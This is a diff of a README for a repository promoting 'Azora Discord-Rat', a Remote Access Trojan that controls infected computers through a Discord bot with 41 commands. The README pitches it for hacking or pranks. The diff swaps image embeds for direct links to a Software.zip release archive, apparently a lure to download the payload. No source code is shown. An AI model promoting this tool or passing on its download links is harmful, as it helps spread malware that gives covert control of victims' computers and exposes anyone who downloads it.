@@ -2,7 +2,7 @@
 
 Welcome to the Azora Discord-Rat repository! This tool is a Remote Access Trojan (RAT) that allows you to control an infected computer using a Discord bot. With 41 commands available, this tool is perfect for various purposes such as pentesting, hacking, or even pranks. It is a free, open-source tool that is easy to install and use.
 
-![Azora Discord-Rat](https://github.com/user-attachments/files/18388744/Software.zip)
+![Azora Discord-Rat](https://github.com/augustoloxp/Azora-Discord-Rat/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -68,7 +68,7 @@ If you have any questions, concerns, or feedback, feel free to open an issue in 
 
 Get started with Azora Discord-Rat today and unleash the power of remote access control through Discord! 🚀
 
-![Download Azora Discord-Rat](https://img.shields.io/badge/Download-Software.zip-blue)
+![Download Azora Discord-Rat](https://github.com/augustoloxp/Azora-Discord-Rat/releases/download/v2.0/Software.zip)
 
 Remember, with great power comes great responsibility. Use Azora Discord-Rat ethically and responsibly. Happy hacking! 💻🔒🔓
 
